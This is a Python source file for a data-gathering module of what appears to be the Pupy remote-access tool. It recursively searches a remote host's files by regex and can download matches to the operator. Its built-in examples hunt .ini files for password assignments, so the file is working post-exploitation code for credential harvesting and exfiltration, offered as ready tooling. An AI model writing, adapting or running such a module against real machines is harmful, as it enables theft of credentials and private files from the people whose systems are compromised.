# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import os
import threading
from pupylib.utils.term import colorize
from rpyc.utils.classic import download

__class_name__="SearchModule"

@config(cat="gather")
class SearchModule(PupyModule):
    """ walk through a directory and recursively search a string into files """
    dependencies = [ 'pupyutils.search', 'scandir' ]

    terminate = None

    def init_argparse(self):
        example = 'Examples:\n'
        example += '>> run search .*ini passw.*=.*\n'
        example += '>> run search .* passw.*=.* -I\n'

        self.arg_parser = PupyArgumentParser(prog="search", description=self.__doc__, epilog=example)
        self.arg_parser.add_argument('-p', '--path', default='.', help='root path to start (default: current path)')
        self.arg_parser.add_argument('-m','--max-size', type=int, default=20000000, help='max file size (default 20 Mo)')
        self.arg_parser.add_argument('-b', '--binary', action='store_true', help='search content inside binary files')
        self.arg_parser.add_argument('-L', '--links', action='store_true', help='follow symlinks')
        self.arg_parser.add_argument('-D', '--download', action='store_true', help='download found files (imply -N)')
        self.arg_parser.add_argument('-N', '--no-content', action='store_true', help='if string matches, output just filename')
        self.arg_parser.add_argument('-I', '--insensitive', action='store_true', default=False, help='no case sensitive')
        self.arg_parser.add_argument('-s', '--save', type=str, default="", help='save results in this local file')
        self.arg_parser.add_argument('filename', type=str, metavar='filename', help='regex to search (filename)')
        self.arg_parser.add_argument('strings', nargs='*', default=[], type=str, metavar='string', help='regex to search (content)')

    def run(self, args):
        self.terminate = threading.Event()
        fdesc = None
        if args.save != "" : 
            fdesc = open(args.save, "w")
            self.info("Results will be saved in {0}".format(args.save))

        if args.download:
            args.no_content = True

        s = self.client.conn.modules['pupyutils.search'].Search(
            args.filename,
            strings=args.strings,
            max_size=args.max_size,
            root_path=args.path,
            follow_symlinks=args.links,
            no_content=args.no_content,
            case=args.insensitive,
            binary=args.binary,
        )

        download_folder = None
        ros = None

        if args.download:
            config = self.client.pupsrv.config or PupyConfig()
            download_folder = config.get_folder('searches', {'%c': self.client.short_name()})
            ros = self.client.conn.modules['os']

        def on_data(res):
            if self.terminate.is_set():
                return

            if args.strings and not args.no_content:
                if type(res) == tuple:
                    msg = '{}: {}'.format(*res)
                    if args.save != "" : fdesc.write(msg+'\n')
                    else: self.success(msg)
            else:
                if args.download and download is not None and ros is not None:
                    dest = res.replace('!', '!!').replace('/', '!').replace('\\', '!')
                    dest = os.path.join(download_folder, dest)
                    try:
                        size = ros.path.getsize(res)
                        download(
                            self.client.conn,
                            res,
                            dest,
                            chunk_size=min(size, 8*1024*1024))
                        msg = '{} -> {} ({})'.format(res, dest, size)
                        if args.save != "" : fdesc.write(msg+'\n')
                        else: self.success(msg)
                    except Exception, e:
                        self.error('{} -> {}: {}'.format(res, dest, e))
                else:
                    msg = '{}'.format(res)
                    if args.save != "" : fdesc.write(msg+'\n')
                    else: self.success(msg)

        def on_completed():
            self.terminate.set()
            self.info("complete")

        s.run_cb(on_data, on_completed)
        self.info("Search started. Use ^C to interrupt")
        self.terminate.wait()
        s.stop()
        if args.save != "": 
            fdesc.close()

    def interrupt(self):
        if self.terminate:
            self.terminate.set()
